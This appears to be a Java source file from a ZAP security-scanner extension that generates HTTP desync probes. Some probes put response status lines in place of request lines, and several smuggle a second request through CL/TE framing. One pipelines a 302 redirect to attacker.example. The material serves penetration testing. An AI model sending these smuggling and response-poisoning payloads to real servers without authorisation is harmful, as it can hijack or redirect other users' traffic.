package org.zaproxy.zap.extension.hacktor.technique;

import java.util.List;
import java.util.function.BiConsumer;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import org.zaproxy.zap.extension.hacktor.VulnCatalog;

/**
 * The response-as-request and pipelined-response classes from PortSwigger's
 * <em>http-terminator</em> flamer stage
 * ({@code flamer/import-response-as-request.json}).
 *
 * <p>Servers only ever <em>send</em> a status line; a request parser that
 * receives one has to reject it, tokenise it into nonsense, or — if the same
 * parser handles both directions — handle it correctly and desync from the peer
 * that does not. That makes the status line a cheap differential probe, and it is
 * also a way to smuggle a second request: a lenient front end skips the status
 * line and the origin reads what follows as the next request.
 *
 * <p>Two shapes are covered, both from the upstream corpus:
 * <ul>
 *   <li><b>response-as-request</b> — a bare response start-line where the request
 *       line should be, e.g. {@code HTTP/1.1 200 OK} tokenised as
 *       method/version, target/status, version/reason;</li>
 *   <li><b>pipelined-response</b> — a real request followed by a response on the
 *       same connection, which is what a front end that desynchronised its
 *       response queue would leave behind.</li>
 * </ul>
 *
 * <p>A status line is written as the request line by mapping its three tokens onto
 * the three request-line fields — {@code HTTP/1.1} / {@code 200} / {@code OK} —
 * which reproduces the original bytes exactly on the wire while keeping ZAP's
 * request-header model well-formed. All seventeen upstream requests are covered
 * (nine start-line, eight pipelined) plus one extension ({@code Res204}).
 */
public class ResponseAsRequestTechniqueBuilder extends DesyncTechniqueBuilder {

    @Override public String getFamily() { return "Response-as-Request"; }
    @Override public int getOrder() { return 71; }

    @Override public Technique.Position getPosition() { return Technique.Position.REQUEST; }


    private static final String FAMILY = "Response-as-Request";

    /**
     * The nine "response-as-request" requests of the upstream corpus, in file
     * order, plus one extension. label, description, response start-line, extra
     * request headers, body template, framing.
     *
     * <p>Two of these declare framing that {@code applyRaw} would otherwise
     * normalise away, so they use {@link Framing#AS_DECLARED}: the
     * response-headers probe is {@code Content-Length: 0}, and the CL.TE probe
     * needs {@code Content-Length: 5} and {@code Transfer-Encoding: chunked} in
     * the same message with a body of 5 + smuggled bytes.</p>
     */
    private static final Object[][] START_LINE_CORPUS = {
        {"Res200Bare", "a bare 200 response start-line in place of the request line",
            "HTTP/1.1 200 OK", null, null, Framing.EOF},
        {"Res100Bare", "a 1xx interim response on the request channel - a server never receives one",
            "HTTP/1.1 100 Continue", null, null, Framing.EOF},
        {"Res101Upgrade", "a 101 Switching Protocols status line with an h2c upgrade",
            "HTTP/1.1 101 Switching Protocols",
            new String[][]{{"Upgrade", "h2c"}, {"Connection", "Upgrade"}}, null, Framing.EOF},
        {"ResHTTP2", "an HTTP/2 response start-line on an HTTP/1 connection",
            "HTTP/2.0 200 OK", null, null, Framing.EOF},
        {"Res200WithHeaders", "a 200 start-line carrying response-only headers",
            "HTTP/1.1 200 OK",
            new String[][]{{"Server", "nginx"}, {"Content-Type", "text/html"},
                {"Set-Cookie", "a=1"}, {"Content-Length", "0"}},
            null, Framing.AS_DECLARED},
        {"ResCLBody", "a 200 response start-line whose Content-Length covers a smuggled request",
            "HTTP/1.1 200 OK", null, "$payload", Framing.CL},
        {"ResTEBody", "a 200 response start-line with Transfer-Encoding: chunked over a smuggled request",
            "HTTP/1.1 200 OK", null, "0\r\n\r\n$payload", Framing.CHUNKED},
        {"ResCLTEBody", "a 200 start-line with conflicting CL and TE - CL covers only the chunked "
                + "terminator, so both parsers stop there and the trailing request is the next message",
            "HTTP/1.1 200 OK",
            new String[][]{{"Content-Length", "5"}, {"Transfer-Encoding", "chunked"}},
            "0\r\n\r\n$payload", Framing.AS_DECLARED},
        {"ResNoFraming", "a 200 start-line with no body framing at all, immediately followed "
                + "by a smuggled request",
            "HTTP/1.1 200 OK", null, "$payload", Framing.EOF},
        // Not in the upstream corpus: 204 is a status code that cannot legally carry
        // a body, so a parser that believes the start line and a parser that knows
        // the status code disagree about where the next message starts.
        {"Res204", "a 204 No Content start-line - a status code that cannot carry a body",
            "HTTP/1.1 204 No Content", null, null, Framing.EOF},
    };

    /**
     * The eight "pipelined-response" requests of the upstream corpus. A
     * well-formed request followed by a response on the same connection, i.e. a
     * desync that is already visible in the bytes we send. label, description,
     * method, extra request headers, body template, framing.
     */
    private static final Object[][] PIPELINED_CORPUS = {
        {"Pipe200", "a request followed by a 200 response on the same connection",
            "GET", null, "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n", Framing.EOF},
        {"Pipe101", "a request followed by a 101 websocket upgrade response",
            "GET", null,
            "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
            Framing.EOF},
        {"Pipe100", "a request followed by a 100 Continue response",
            "GET", null, "HTTP/1.1 100 Continue\r\n\r\n", Framing.EOF},
        {"PipeSandwich", "a 0-CL POST, then a response, then a smuggled request",
            "POST", null, "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n$payload", Framing.CL0},
        {"PipeStarve", "a request that announces 100 body bytes and then sends none",
            "GET", null, "HTTP/1.1 200 OK\r\nContent-Length: 100\r\n\r\n", Framing.EOF},
        {"PipeTE", "a request followed by a chunked response and a smuggled request",
            "GET", null, "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n$payload",
            Framing.EOF},
        {"PipeRedirect", "a request followed by a 302 that points a queued response elsewhere",
            "GET", null,
            "HTTP/1.1 302 Found\r\nLocation: https://attacker.example/\r\nContent-Length: 0\r\n\r\n",
            Framing.EOF},
        {"PipeClose", "Connection: close followed by a response",
            "GET", new String[][]{{"Connection", "close"}},
            "HTTP/1.1 200 OK\r\n\r\n", Framing.EOF},
    };

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      PathContext ctx) {
        final String baseClean = ctx.baseClean;

        // ── a status line where the request line belongs ───────────────────
        for (Object[] row : START_LINE_CORPUS) {
            final String label = (String) row[0];
            final String desc = (String) row[1];
            final String startLine = (String) row[2];
            @SuppressWarnings("unchecked")
            final String[][] headers = (String[][]) row[3];
            final String bodyTemplate = (String) row[4];
            final Framing framing = (Framing) row[5];
            final String body = bodyTemplate == null ? null : withSmuggled(bodyTemplate, baseClean);

            Technique tech = new Technique(FAMILY, label, desc,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    applyStatusLine(c, startLine);
                    applyRaw(c, null, headers, body, framing);
                    // applyRaw() may have rewritten the framing headers but never
                    // the request line, so the status line survives it.
                    return c;
                });
            tech.setTier(label.equals("Res200Bare") || label.equals("ResCLBody")
                ? VulnCatalog.Tier.CLASSIC : VulnCatalog.Tier.RARE);
            tech.setDiscardOn(400, 404);
            tech.setDiscardEmptyBody(true);
            markRawAdd(techs, tech);
        }

        // ── a well-formed request followed by a response ───────────────────
        for (Object[] row : PIPELINED_CORPUS) {
            final String label = (String) row[0];
            final String desc = (String) row[1];
            final String method = (String) row[2];
            @SuppressWarnings("unchecked")
            final String[][] headers = (String[][]) row[3];
            final String body = withSmuggled((String) row[4], baseClean);
            final Framing framing = (Framing) row[5];

            Technique tech = new Technique(FAMILY, label, desc,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    applyRaw(c, method, headers, body, framing);
                    return c;
                });
            tech.setTier(label.equals("Pipe200") ? VulnCatalog.Tier.CLASSIC : VulnCatalog.Tier.RARE);
            tech.setDiscardOn(400, 404);
            tech.setDiscardEmptyBody(true);
            markRawAdd(techs, tech);
        }
    }

    /**
     * Writes {@code startLine} as the request line. The bytes are forced verbatim
     * because {@code setVersion} upper-cases the reason phrase ({@code Continue}
     * would become {@code CONTINUE}); the tokenised form is kept on the message too
     * so the request viewer still shows how a parser tokenises the line.
     */
    private static void applyStatusLine(HttpMessage c, String startLine) {
        int sp1 = startLine.indexOf(' ');
        String first = sp1 < 0 ? startLine : startLine.substring(0, sp1);
        int sp2 = sp1 < 0 ? -1 : startLine.indexOf(' ', sp1 + 1);
        String second = sp1 < 0 ? "" : startLine.substring(sp1 + 1, sp2 < 0 ? startLine.length() : sp2);
        String third = sp2 < 0 ? "" : startLine.substring(sp2 + 1);
        setMethod(c, first);
        setVerbatimWirePath(c, second);
        setHTTPVersion(c, third.isEmpty() ? "HTTP/1.1" : third);
        setWireRequestLine(c, startLine);
    }
}
